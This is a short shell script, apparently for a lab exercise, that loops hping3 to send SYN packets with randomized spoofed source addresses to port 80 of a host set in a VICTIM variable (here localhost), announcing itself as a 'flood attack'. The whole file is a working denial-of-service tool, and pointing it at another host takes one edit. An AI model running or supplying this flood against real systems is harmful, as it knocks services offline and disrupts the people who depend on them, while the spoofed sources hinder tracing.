VICTIM="localhost"

while true; do
	echo "Trying to flood attack to $VICTIM..."

	## --interval u100000 is used to set the interval between packets to 100,000 microseconds = 0.1 seconds
	hping3 -S -p 80 --rand-source --interval u100000 localhost
done